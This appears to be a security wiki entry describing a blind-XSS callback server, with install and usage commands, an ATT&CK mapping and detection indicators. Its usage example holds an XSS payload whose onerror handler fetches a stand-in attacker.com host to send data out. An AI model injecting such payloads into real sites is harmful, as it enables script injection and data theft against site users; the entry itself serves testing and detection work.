---
id: t1b2c3d4-e5f6-7890-abcd-ef1234567897
url: null
name: Custom-Blind-XSS-Application
tags:
  - xss
  - detection
type: tool
verified: false
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.059Z'
validated: true
submitted: true
---
# Custom-Blind-XSS-Application

**Status**: Unverified

## Overview

A custom web application designed to detect blind XSS executions by receiving callbacks from injected payloads, logging details like origin and executed code for proof-of-concept validation.

## Description

In blind XSS scenarios, direct observation is impossible, so this tool hosts a simple server (e.g., using Node.js or PHP) that captures HTTP requests triggered by onerror handlers in payloads. It decodes base64-encoded JavaScript and logs execution context, aiding in vulnerability confirmation and impact assessment.

## Features

- Feature 1: HTTP endpoint for payload callbacks
- Feature 2: Base64 decoding of alert/eval payloads
- Feature 3: Logging of source IP, user-agent, and timestamp

## Installation

### Requirements

- Web server (e.g., Node.js, Apache)
- Publicly accessible domain/IP

### Install Commands

```bash
# Example with Node.js: npm init; npm install express
node server.js
```

## Basic Usage

```bash
# Run the server on port 80
node blind-xss-server.js
```

### Common Options

| Option | Description |
|--------|-------------|
| --port | Server port (default 80) |
| --log | Enable detailed logging |

## Examples

### Example 1: Basic Usage

Host a page that logs GET requests to /callback.

Payload integration: <img src=x onerror=fetch('http://attacker.com/callback?data='+btoa('executed'))>

### Example 2: Advanced Usage

```bash
node server.js --port 8080 --decode-base64
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]] Command and Scripting Interpreter: JavaScript

### Tactics

- [[Collection]] Collection

## Detection

Indicators and methods for detecting this tool's usage:

- Suspicious outbound fetches to unknown domains from browsers
- Server logs showing anomalous GET requests with base64
- Network traffic to non-standard XSS callback endpoints

## Related Procedures

- [[procedures/Trigger-and-Detect-Blind-XSS-Execution]]

## Related Tools

- [[tools/Wayback-Machine]]

## References

- Related resources: OWASP XSS Prevention Cheat Sheet
